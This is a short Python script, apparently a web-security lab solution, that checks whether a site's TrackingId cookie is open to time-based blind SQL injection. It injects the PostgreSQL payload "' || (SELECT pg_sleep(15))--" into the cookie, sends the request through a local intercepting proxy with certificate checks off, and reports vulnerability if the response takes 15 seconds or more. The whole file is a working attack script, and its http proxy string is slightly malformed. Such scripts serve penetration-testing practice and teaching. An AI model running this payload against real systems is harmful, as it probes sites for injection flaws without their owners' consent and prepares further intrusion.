import requests
import sys
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http:127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def sqli_time_delay(url):  # need to update values for TrackingId and session
    sql_payload = "' || (SELECT pg_sleep(15))--"
    sql_payload_urlencoded = urllib.parse.quote(sql_payload)
    cookies = {'TrackingId': 'G804YzZa1NK5uR4R' + sql_payload_urlencoded,
               'session': 'rlTspLgccWUzCabpclnUBecF0IKaaReU'}
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    time_delay = int(r.elapsed.total_seconds())
    print("The time delay is: %s" % time_delay)
    if time_delay >= 15:
        print("Vulnerable to time delay blind SQLi")
    else:
        print("Not vulnerable to blind sqli using time delay")


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com " % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("[+] Checking if tracking cookie is vulnerable to blind SQLi")
    sqli_time_delay(url)


if __name__ == "__main__":
    main()
